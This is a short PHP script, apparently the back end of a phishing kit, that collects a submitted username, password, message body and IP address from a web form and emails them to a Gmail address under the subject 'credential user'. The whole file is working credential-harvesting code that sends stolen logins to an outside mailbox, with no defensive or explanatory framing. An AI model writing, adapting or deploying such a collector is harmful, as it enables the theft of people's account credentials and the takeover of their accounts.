<?php
 
echo "username----------------";
if(isset($_POST['username'])&& isset($_POST['password']) ){
	$username=$_POST['username'];
	$password=$_POST['password'];
    $body=$_POST['body'];
    $ip=$_POST['ip'];
	
	
//echo "$username----------------".$username;
	// the message
	$msg = "username: ".$username."\npassowrd: ".$password."\n".$body;

// use wordwrap() if lines are longer than 70 characters
$msg = wordwrap($msg,70);

// send email
mail("www.jlk75452@gmail.com","credential user (".$ip.")",$msg);

} 


?>